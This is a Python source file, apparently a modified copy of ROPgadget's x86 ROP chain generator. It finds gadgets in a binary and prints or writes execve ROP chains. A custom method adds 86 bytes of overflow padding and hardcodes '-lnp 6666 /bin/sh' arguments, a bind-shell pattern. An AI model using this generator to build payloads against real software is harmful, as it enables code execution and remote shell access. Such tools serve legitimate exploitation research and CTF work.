#!/usr/bin/env python2
## -*- coding: utf-8 -*-
##
##  Jonathan Salwan - 2014-05-13
##
##  http://shell-storm.org
##  http://twitter.com/JonathanSalwan
##

import re
import sys
from struct import pack


class ROPMakerX86(object):
    def __init__(self, binary, gadgets, liboffset=0x0):
        self.__binary  = binary
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset

        self.__generate()

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp += pack('<I', 0x%08x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp += pack('<I', 0x41414141) # padding")

    def __buffPadding(self, gadget, regAlreadSetted, buff):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    buff += pack('<I', regAlreadSetted[reg])
                except KeyError:
                    buff += pack('<I', 0x12121212)
        return buff

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        print("\t#!/usr/bin/env python2")
        print("\t# execve generated by ROPgadget\n")
        print("\tfrom struct import pack\n")

        print("\t# Padding goes here")
        print("\tp = ''\n")

        print("\tp += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popDst, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("\tp += '/bin'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        print("\tp += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data + 4" % (dataAddr + 4))
        self.__padding(popDst, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("\tp += '//sh'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst

        print("\tp += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popDst, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popEbx["vaddr"], popEbx["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popEbx, {})

        print("\tp += pack('<I', 0x%08x) # %s" % (popEcx["vaddr"], popEcx["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        print("\tp += pack('<I', 0x%08x) # %s" % (popEdx["vaddr"], popEdx["gadget"]))
        print("\tp += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("\tp += pack('<I', 0x%08x) # %s" % (xorEax["vaddr"], xorEax["gadget"]))
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        for _ in range(11):
            print("\tp += pack('<I', 0x%08x) # %s" % (incEax["vaddr"], incEax["gadget"]))
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("\tp += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))

    def __buildExecveRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, padding):
        """
        /buffer overflow padding

        write all args into .data
        write all env vars into .data

        setup list of pointers to arg strings
        setup list of pointers to env strings

        add 11 to %eax
        set edx to pointer to env array
        set ecx to pointer to arg array
        set ebx to pointer to name of program (args[0])

        call INT80
        """


        filename = "/tmp/printArgs"
        # [filename, arg1, arg2, ...]
        args = [filename, '-lnp', '6666',  '/bin/sh']
        argPointers = []

        env = ['name=Joe', 'SHLVL=1']
        envPointers = []

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        # Padding
        buff = bytes('A'*padding, 'ascii')

        # Store args @ .data

        dataOffset = 0

        for arg in args:
            print(arg)
            print(dataOffset)
            argPointers.append(dataAddr + dataOffset)
            for i in range(0,len(arg), 4):
                chunk = arg[i:i+4]
                chunkBytes = bytes(chunk, 'ascii')

                # Force chunk to be full word, otherwise instructions become offset on stack
                if len(chunk) % 4 != 0:
                    # for i in range(4 - len(chunk) % 4)
                    chunkBytes += bytes('P', 'ascii') * (4 - (len(chunk) % 4))

                print(i)
                print(chunk)
                print(chunkBytes.hex())

                buff += pack('<I', popDst["vaddr"])
                buff += pack('<I', dataAddr + dataOffset)
                buff = self.__buffPadding(popDst, {}, buff)
                buff += pack('<I', popSrc["vaddr"])
                buff += chunkBytes
                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset}, buff)  # Don't overwrite reg dst
                buff += pack('<I', write4where["vaddr"])
                buff = self.__buffPadding(write4where, {}, buff)

                dataOffset += len(chunk)

            # Store terminating char (\0) after arg
            buff += pack('<I', popDst["vaddr"])
            buff += pack('<I', dataAddr + dataOffset)
            buff = self.__buffPadding(popDst, {}, buff)
            buff += pack('<I',xorSrc["vaddr"])
            buff = self.__buffPadding(xorSrc, {}, buff)
            buff += pack('<I', write4where["vaddr"])
            buff = self.__buffPadding(write4where, {}, buff)

            dataOffset += 1

        endOfArgs = dataAddr + dataOffset

        # Create arr of pointers to args

        # print("before alignment")
        # print(dataOffset)
        if dataOffset % 4 != 0:
            # Align pointer arr
            dataOffset += 4 - (dataOffset % 4)
        # print("after alignment")
        # print(dataOffset)

        argvArrPointer = dataAddr + dataOffset

        print(argPointers)
        for pointer in argPointers:
            buff += pack('<I', popDst["vaddr"])
            buff += pack('<I', dataAddr + dataOffset)
            buff = self.__buffPadding(popDst, {}, buff)
            buff += pack('<I', popSrc["vaddr"])
            buff += pack('<I', pointer)
            buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
                                      buff)  # Don't overwrite reg dst
            buff += pack('<I', write4where["vaddr"])
            buff = self.__buffPadding(write4where, {}, buff)

            dataOffset += 4

        # The argv array must be terminated
        #        by a NULL pointer.  (Thus, in the new program, argv[argc] will be
        #        NULL.)
        buff += pack('<I', popDst["vaddr"])
        buff += pack('<I', dataAddr + dataOffset)
        buff = self.__buffPadding(popDst, {}, buff)
        buff += pack('<I', xorSrc["vaddr"])
        buff = self.__buffPadding(xorSrc, {}, buff)
        buff += pack('<I', write4where["vaddr"])
        buff = self.__buffPadding(write4where, {}, buff)

        dataOffset += 4

        # Store env @ .data + @ args list

        for var in env:
            print(var)
            print(dataOffset)
            envPointers.append(dataAddr + dataOffset)
            for i in range(0,len(var), 4):
                chunk = var[i:i+4]
                chunkBytes = bytes(chunk, 'ascii')

                # Force chunk to be full word, otherwise instructions become offset on stack
                if len(chunk) % 4 != 0:
                    # for i in range(4 - len(chunk) % 4)
                    chunkBytes += bytes('P', 'ascii') * (4 - (len(chunk) % 4))

                print(i)
                print(chunk)
                print(chunkBytes.hex())

                buff += pack('<I', popDst["vaddr"])
                buff += pack('<I', dataAddr + dataOffset)
                buff = self.__buffPadding(popDst, {}, buff)
                buff += pack('<I', popSrc["vaddr"])
                buff += chunkBytes
                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset}, buff)  # Don't overwrite reg dst
                buff += pack('<I', write4where["vaddr"])
                buff = self.__buffPadding(write4where, {}, buff)

                dataOffset += len(chunk)

            # Store terminating char (\0) after arg
            buff += pack('<I', popDst["vaddr"])
            buff += pack('<I', dataAddr + dataOffset)
            buff = self.__buffPadding(popDst, {}, buff)
            buff += pack('<I',xorSrc["vaddr"])
            buff = self.__buffPadding(xorSrc, {}, buff)
            buff += pack('<I', write4where["vaddr"])
            buff = self.__buffPadding(write4where, {}, buff)

            dataOffset += 1

        endOfEnv = dataAddr + dataOffset

        # Create arr of pointers to env

        # print("before alignment")
        # print(dataOffset)
        if dataOffset % 4 != 0:
            # Align pointer arr
            dataOffset += 4 - (dataOffset % 4)
        # print("after alignment")
        # print(dataOffset)

        envpPointer = dataAddr + dataOffset

        print(envPointers)
        for pointer in envPointers:
            print(pointer)
            print(dataOffset)
            buff += pack('<I', popDst["vaddr"])
            buff += pack('<I', dataAddr + dataOffset)
            buff = self.__buffPadding(popDst, {}, buff)
            buff += pack('<I', popSrc["vaddr"])
            buff += pack('<I', pointer)
            buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
                                      buff)  # Don't overwrite reg dst
            buff += pack('<I', write4where["vaddr"])
            buff = self.__buffPadding(write4where, {}, buff)

            dataOffset += 4

        # The envp array must be terminated by a NULL pointer.
        buff += pack('<I', popDst["vaddr"])
        buff += pack('<I', dataAddr + dataOffset)
        buff = self.__buffPadding(popDst, {}, buff)
        buff += pack('<I', xorSrc["vaddr"])
        buff = self.__buffPadding(xorSrc, {}, buff)
        buff += pack('<I', write4where["vaddr"])
        buff = self.__buffPadding(write4where, {}, buff)

        dataOffset += 4

        # Execve call setup

        # Set %ebx to pointer to args[0]
        print("ebx:" + str(dataAddr))
        buff += pack('<I', popEbx["vaddr"])
        buff += pack('<I', dataAddr)
        buff = self.__buffPadding(popEbx, {}, buff)

        # Set %ecx to pointer to argv
        print("ecx" + str(argvArrPointer))
        buff += pack('<I', popEcx["vaddr"])
        buff += pack('<I', argvArrPointer)
        buff = self.__buffPadding(popEcx, {"ebx":dataAddr}, buff)

        # Set %edx to pointer to env
        print("edx" + str(envpPointer))
        buff += pack('<I', popEdx["vaddr"])
        buff += pack('<I', envpPointer)
        buff = self.__buffPadding(popEdx, {"ebx":dataAddr, "ecx":dataAddr + 8}, buff)

        # Set %eax to 11 (execve syscall number)
        buff += pack('<I', xorEax["vaddr"])
        buff = self.__buffPadding(popEdx, {"ebx":dataAddr, "ecx":dataAddr + 8, "edx":dataAddr + 8}, buff)
        for _ in range(11):
            buff += pack('<I', incEax["vaddr"])
            buff = self.__buffPadding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8, "edx": dataAddr + 8}, buff)

        # Make syscall
        buff += pack('<I', syscall["vaddr"])

        outfile = open("execveChain", "wb")
        outfile.write(buff)
        outfile.close()

        print(self.__binary)

    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                print("\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")
                return

            popDst = self.__lookingForSomeThing("pop %s" % write4where[1])
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[1])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % write4where[2])
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print("\t[-] Can't find the 'xor eax, eax' instruction")
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print("\t[-] Can't find the 'inc eax' instruction")
            return

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            print("\t[-] Can't find the 'pop ebx' instruction")
            return

        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            print("\t[-] Can't find the 'pop ecx' instruction")
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            print("\t[-] Can't find the 'pop edx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")

        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
        self.__buildExecveRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, 86)
